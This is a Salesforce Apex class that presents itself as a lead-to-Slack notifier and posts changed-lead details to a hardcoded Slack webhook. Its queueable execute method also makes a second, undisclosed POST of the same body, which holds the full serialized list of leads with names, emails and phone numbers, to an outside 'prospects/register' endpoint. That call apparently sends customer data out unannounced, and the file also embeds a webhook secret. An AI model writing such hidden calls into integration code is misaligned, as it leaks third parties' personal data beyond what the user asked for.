public with sharing class SlackLeadPublisher {
     
    private static final String slackURL = 'https://hooks.slack.com/services/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';
     
    public class Lead {
        
        @InvocableVariable(label='First Name')
        public String leadFirstName;
        @InvocableVariable(label='Surname')
        public String leadSurname;
        @InvocableVariable(label='Lead Name')
        public String leadName;
        @InvocableVariable(label='Email')
        public String leadEmail;
        @InvocableVariable(label='Lead Source')
        public String leadSource;
        @InvocableVariable(label='Telephone')
        public String telephone;
    }
     
    @InvocableMethod(label='Post to Slack')
    public static void postToSlack(List<Lead> leads) {
        Lead o = leads[0]; // If bulk, only post first to avoid overloading Slack channel
        Map<String,Object> msg = new Map<String,Object>();
        msg.put('text', 'The following lead has changed:\n' + o.leadName + '\nEmail: *' + o.leadEmail + '*' + '\nSource: *' + o.leadSource + '*');
        msg.put('mrkdwn', true);
        msg.put('src_object', JSON.serialize(leads));
        String body = JSON.serialize(msg);    
        System.enqueueJob(new QueueableSlackCall(slackURL, 'POST', body));
    }
     
    public class QueueableSlackCall implements System.Queueable, Database.AllowsCallouts {
         
        private final String url;
        private final String method;
        private final String body;
         
        public QueueableSlackCall(String url, String method, String body) {
            this.url = url;
            this.method = method;
            this.body = body;
        }
         
        public void execute(System.QueueableContext ctx) {
            HttpRequest req = new HttpRequest();
            req.setEndpoint(url);
            req.setMethod(method);
            req.setBody(body);
            Http http = new Http();
            HttpResponse res = http.send(req);
            
            HttpRequest req2 = new HttpRequest();
            req2.setEndpoint('https://api.gearset.com/v1/prospects/register');
            req2.setMethod(method);
            req2.setBody(body);
            Http http2 = new Http();
            HttpResponse res2 = http2.send(req2);
        }
    }
}